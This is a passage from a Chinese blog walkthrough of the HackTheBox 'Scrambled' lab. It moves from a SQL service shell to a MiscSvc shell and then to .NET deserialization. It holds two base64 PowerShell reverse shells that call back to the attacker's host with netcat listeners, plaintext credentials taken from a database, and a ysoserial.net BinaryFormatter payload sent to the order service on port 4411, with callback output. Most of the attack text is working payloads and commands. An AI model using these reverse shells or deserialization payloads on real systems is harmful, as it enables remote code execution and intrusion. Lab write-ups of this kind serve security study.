JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAxACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==</span><br><span class="line"></span><br><span class="line"><span class="comment"># attacker</span></span><br><span class="line">$ rlwrap -cAr nc -lvnp 9001</span><br><span class="line">Listening on 0.0.0.0 9001</span><br><span class="line">Connection received on 10.10.11.168 55474</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">scrm\sqlsvc</span><br><span class="line">PS C:\Windows\system32&gt; </span><br></pre></td></tr></table></figure>
<p><img src="/images/scrambled-8.png"></p>
<h3 id="shell-as-sqlsvc"><a href="#shell-as-sqlsvc" class="headerlink" title="shell as sqlsvc"></a>shell as sqlsvc</h3><p>先看users下面都有啥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line">----                -------------         ------ ----                                                                  </span><br><span class="line">d-----       05/11/2021     21:28                administrator                                                         </span><br><span class="line">d-----       03/11/2021     19:31                miscsvc                                                               </span><br><span class="line">d-r---       26/01/2020     17:54                Public                                                                </span><br><span class="line">d-----       01/06/2022     14:58                sqlsvc                                                                </span><br></pre></td></tr></table></figure>
<p>这里再回去翻一下数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">SQL (SCRM\administrator  dbo@master)&gt; enum_db;</span><br><span class="line">name         is_trustworthy_on   </span><br><span class="line">----------   -----------------   </span><br><span class="line">master                       0   </span><br><span class="line"></span><br><span class="line">tempdb                       0   </span><br><span class="line"></span><br><span class="line">model                        0   </span><br><span class="line"></span><br><span class="line">msdb                         1   </span><br><span class="line"></span><br><span class="line">ScrambleHR                   0   </span><br><span class="line"></span><br><span class="line">SQL (SCRM\administrator  dbo@ScrambleHR)&gt; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = <span class="string">&#x27;BASE TABLE&#x27;</span>;</span><br><span class="line">TABLE_NAME   </span><br><span class="line">----------   </span><br><span class="line">Employees    </span><br><span class="line"></span><br><span class="line">UserImport   </span><br><span class="line"></span><br><span class="line">Timesheets   </span><br><span class="line"></span><br><span class="line">SQL (SCRM\administrator  dbo@ScrambleHR)&gt; <span class="keyword">select</span> * from UserImport;</span><br><span class="line">LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   </span><br><span class="line">--------   -----------------   ----------   ---------------   -------------   </span><br><span class="line">MiscSvc    ScrambledEggs9900   scrm.local                90               0   </span><br></pre></td></tr></table></figure>
<p>有了miscsvc的密码，<br>弹一个shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\sqlsvc\desktop&gt; <span class="variable">$SecPassword</span> = ConvertTo-SecureString <span class="string">&#x27;ScrambledEggs9900&#x27;</span> -AsPlainText -Force</span><br><span class="line">PS C:\Users\sqlsvc\desktop&gt; <span class="variable">$Cred</span> = New-Object System.Management.Automation.PSCredential(<span class="string">&#x27;scrm.local\MiscSvc&#x27;</span>, <span class="variable">$SecPassword</span>)</span><br><span class="line">PS C:\Users\sqlsvc\desktop&gt; Invoke-Command -Computer 127.0.0.1 -Credential <span class="variable">$Cred</span> -ScriptBlock &#123; powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAxACIALAA5ADAAMAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== &#125;</span><br><span class="line"></span><br><span class="line">$ rlwrap -cAr nc -lvnp 9002</span><br><span class="line">Listening on 0.0.0.0 9002</span><br><span class="line">Connection received on 10.10.11.168 55584</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">scrm\miscsvc</span><br><span class="line">PS C:\Users\miscsvc\Documents&gt; </span><br></pre></td></tr></table></figure>
<h2 id="shell-as-miscsvc"><a href="#shell-as-miscsvc" class="headerlink" title="shell as miscsvc"></a>shell as miscsvc</h2><p>看users下面，下一步应该就是administrator了（当然这种思想不对，应该仔细去想怎么横向，怎么枚举，怎么利用）<br>在C盘下面有一个shares目录<br>进去翻一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Shares&gt; <span class="built_in">cd</span> HR</span><br><span class="line">PS C:\Shares\HR&gt; <span class="built_in">dir</span></span><br><span class="line">PS C:\Shares\HR&gt; <span class="built_in">dir</span> -h</span><br><span class="line">PS C:\Shares\HR&gt; <span class="built_in">cd</span> ..</span><br><span class="line">PS C:\Shares&gt; <span class="built_in">cd</span> IT</span><br><span class="line">PS C:\Shares\IT&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Shares\IT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                              </span><br><span class="line">----                -------------         ------ ----                                              </span><br><span class="line">d-----       03/11/2021     21:06                Apps                                              </span><br><span class="line">d-----       03/11/2021     19:32                Logs                                              </span><br><span class="line">d-----       03/11/2021     19:32                Reports       </span><br><span class="line"></span><br><span class="line">PS C:\Shares\IT&gt; <span class="built_in">cd</span> Apps</span><br><span class="line">PS C:\Shares\IT\Apps&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Shares\IT\Apps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                              </span><br><span class="line">----                -------------         ------ ----                                              </span><br><span class="line">d-----       05/11/2021     20:57                Sales Order Client                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Shares\IT\Apps&gt; <span class="built_in">cd</span> <span class="string">&quot;Sales Order Client&quot;</span></span><br><span class="line">PS C:\Shares\IT\Apps\Sales Order Client&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Shares\IT\Apps\Sales Order Client</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                              </span><br><span class="line">----                -------------         ------ ----                                              </span><br><span class="line">-a----       05/11/2021     20:52          86528 ScrambleClient.exe                                </span><br><span class="line">-a----       05/11/2021     20:52          19456 ScrambleLib.dll   </span><br></pre></td></tr></table></figure>
<p>剩下两个文件夹倒是没有东西了，这个文件夹还是smb共享目录，那从smb下载吧<br>dnspy打开dll文件看看<br><img src="/images/scrambled-9.png"><br>如果勾选那个pdf中所说的enable log就会生成一个txt文件<br><img src="/images/scrambled-10.png"><br>然后可以通过<code>scrmdev</code>登录的话就可以不需要密码了<br><img src="/images/scrambled-11.png"><br>尝试了一下确实这个用户可以无密码登录，但是我的Windows虚拟机没有连接到vpn里面<br><img src="/images/scrambled-12.png"><br>wine打开，凑活看一下，记得勾选那个日志功能看日志<br><img src="/images/scrambled-13.png"><br>解一下看看<br><img src="/images/scrambled-14.png"><br>解个jb，应该是经过序列化编译的<br>接着翻反编译的吧<br>上图中的new order部分对应应该是<img src="/images/scrambled-15.png"><br>而uploadorder还在NewRequest部分被调用了<br><img src="/images/scrambled-16.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">// Token: 0x0600002D RID: 45 RVA: 0x000025C8 File Offset: 0x000007C8</span><br><span class="line">public void UploadOrder(SalesOrder NewOrder)</span><br><span class="line">&#123;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		Log.Write(<span class="string">&quot;Uploading new order with reference &quot;</span> + NewOrder.ReferenceNumber);</span><br><span class="line">		string text = NewOrder.SerializeToBase64();</span><br><span class="line">		Log.Write(<span class="string">&quot;Order serialized to base64: &quot;</span> + text);</span><br><span class="line">		ScrambleNetResponse scrambleNetResponse = this.SendRequestAndGetResponse(new ScrambleNetRequest(ScrambleNetRequest.RequestType.UploadOrder, text));</span><br><span class="line">		ScrambleNetResponse.ResponseType <span class="built_in">type</span> = scrambleNetResponse.Type;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">type</span> != ScrambleNetResponse.ResponseType.Success)</span><br><span class="line">		&#123;</span><br><span class="line">			throw new ApplicationException(scrambleNetResponse.GetErrorDescription());</span><br><span class="line">		&#125;</span><br><span class="line">		Log.Write(<span class="string">&quot;Upload successful&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	catch (Exception ex)</span><br><span class="line">	&#123;</span><br><span class="line">		Log.Write(<span class="string">&quot;Error: &quot;</span> + ex.Message);</span><br><span class="line">		throw ex;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  		// Token: 0x0600002E RID: 46 RVA: 0x00002664 File Offset: 0x00000864</span><br><span class="line">private ScrambleNetResponse SendRequestAndGetResponse(ScrambleNetRequest Request)</span><br><span class="line">&#123;</span><br><span class="line">	Log.Write(<span class="string">&quot;Connecting to server&quot;</span>);</span><br><span class="line">	TcpClient tcpClient = new TcpClient();</span><br><span class="line">	tcpClient.ReceiveTimeout = checked((int)Math.Round(TimeSpan.FromSeconds(<span class="number">20.0</span>).TotalMilliseconds));</span><br><span class="line">	tcpClient.ReceiveBufferSize = 2048;</span><br><span class="line">	tcpClient.SendBufferSize = 2048;</span><br><span class="line">	tcpClient.Connect(this.Server, this.Port);</span><br><span class="line">	ScrambleNetResponse result;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		using (NetworkStream stream = tcpClient.GetStream())</span><br><span class="line">		&#123;</span><br><span class="line">			using (StreamWriter streamWriter = new StreamWriter(stream, Encoding.ASCII))</span><br><span class="line">			&#123;</span><br><span class="line">				streamWriter.AutoFlush = <span class="literal">true</span>;</span><br><span class="line">				<span class="keyword">if</span> (this.GetResponse(stream).Type != ScrambleNetResponse.ResponseType.Banner)</span><br><span class="line">				&#123;</span><br><span class="line">					throw new ApplicationException(<span class="string">&quot;Unexpected response from server on initial connection&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				string text = ScrambleNetRequest.GetCodeFromMessageType(Request.Type) + <span class="string">&quot;;&quot;</span> + Request.Parameter + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">				Log.Write(<span class="string">&quot;Sending data to server: &quot;</span> + text);</span><br><span class="line">				streamWriter.Write(text);</span><br><span class="line">				Log.Write(<span class="string">&quot;Getting response from server&quot;</span>);</span><br><span class="line">				ScrambleNetResponse response = this.GetResponse(stream);</span><br><span class="line">				try</span><br><span class="line">				&#123;</span><br><span class="line">					byte[] bytes = Encoding.ASCII.GetBytes(<span class="string">&quot;QUIT\n&quot;</span>);</span><br><span class="line">					stream.Write(bytes, 0, bytes.Length);</span><br><span class="line">					stream.Close();</span><br><span class="line">				&#125;</span><br><span class="line">				catch (Exception ex)</span><br><span class="line">				&#123;</span><br><span class="line">					Log.Write(<span class="string">&quot;Error sending QUIT and closing stream: &quot;</span> + ex.Message);</span><br><span class="line">				&#125;</span><br><span class="line">				result = response;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	finally</span><br><span class="line">	&#123;</span><br><span class="line">		try</span><br><span class="line">		&#123;</span><br><span class="line">			tcpClient.Close();</span><br><span class="line">		&#125;</span><br><span class="line">		catch (Exception ex2)</span><br><span class="line">		&#123;</span><br><span class="line">			Log.Write(<span class="string">&quot;Error closing TCP connection: &quot;</span> + ex2.Message);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里会给4411端口发送序列化之后的数据，数据内容形式是<code>ScrambleNetRequest.GetCodeFromMessageType(Request.Type) + &quot;;&quot; + Request.Parameter + &quot;\n&quot;</code><br>再翻相关调用可以发现，发送内容是<code>UPLOAD_ORDER;&lt;序列化的内容&gt;</code>，应用程序又是.net，序列化就用到<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a>，这里我们用这个<a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net/releases/tag/v1.36">ysoserial.net</a><br>先生成一个测试的payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\liw\Downloads\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt;.\ysoserial.exe -g DataSet -c <span class="string">&quot;cmd /c curl 10.10.16.11&quot;</span> -f BinaryFormatter -o <span class="built_in">base64</span></span><br><span class="line">AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAAKQDAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxgU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNtZCAvYyBjdXJsIDEwLjEwLjE2LjExIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsL</span><br><span class="line"></span><br><span class="line">$ nc 10.10.11.168 4411</span><br><span class="line">SCRAMBLECORP_ORDERS_V1.0.3;</span><br><span class="line">UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAAKQDAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxgU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNtZCAvYyBjdXJsIDEwLjEwLjE2LjExIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsL</span><br><span class="line">ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">sudo</span> python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.10.11.168 - - [06/May/2025 09:06:18] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
<p>有效，上reverse shell</p>
